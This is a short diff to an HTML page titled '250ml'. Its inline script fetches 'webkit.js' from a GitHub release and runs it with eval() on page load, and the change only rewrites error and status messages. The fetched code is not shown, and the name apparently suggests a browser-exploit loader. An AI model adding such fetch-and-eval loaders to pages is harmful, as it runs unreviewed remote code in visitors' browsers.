@@ -5,15 +5,20 @@
   <title>250ml</title>
   <link rel="stylesheet" href="style250.css" />
   <script>
-   fetch("https://github.com/A5x0/500ml-Currently-Unusable-Testing/releases/download/tag/webkit.js")
-     .then(res => {
-       if (!res.ok) throw new Error("Response not OK: " + res.status);
-       return res.text();
-     })
-     .then(code => eval(code))
-     .catch(err => {
-       document.getElementById("status").textContent = "Failed: " + err.message;
-     });
+  fetch("https://github.com/A5x0/500ml-Currently-Unusable-Testing/releases/download/tag/webkit.js")
+    .then(res => {
+      if (!res.ok) {
+       throw new Error(`Fetch failed: HTTP ${res.status} ${res.statusText}`);
+      }
+      return res.text();
+    })
+    .then(code => {
+      document.getElementById("status").textContent = "Success: Executing script";
+      eval(code);
+    })
+    .catch(err => {
+      document.getElementById("status").textContent = "Fetch error: " + err.message;
+    });
 </script>
 </head>
 <body>
